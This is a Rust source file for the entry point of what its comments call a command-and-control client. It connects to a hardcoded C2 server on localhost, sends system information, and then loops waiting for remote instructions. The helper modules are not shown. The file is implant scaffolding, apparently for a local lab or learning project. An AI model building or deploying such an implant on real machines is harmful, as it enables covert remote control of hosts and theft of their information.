use std::io::{self};
use std::net::TcpStream;
use crate::worker::utils::{listening_for_instructions, send_sys_info};

mod config;
mod worker;

/// The main entry point of the client application.
///
/// Establishes a connection to the server for command and control operations,
/// sends initial system information to the server, and manages separate
/// functionalities for sending heartbeats and listening for instructions.
fn main() -> io::Result<()> {
    // C2 address port
    let ip = "127.0.0.1".to_string();
    let port = "8080".to_string();
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port))?;

    println!("[I] Connected to server {}:{}.", ip, port);

    // Send basic sysinfo for the C2 server
    send_sys_info(&mut stream);


    // Infinite loop
    listening_for_instructions(&mut stream).unwrap();

    Ok(())
}

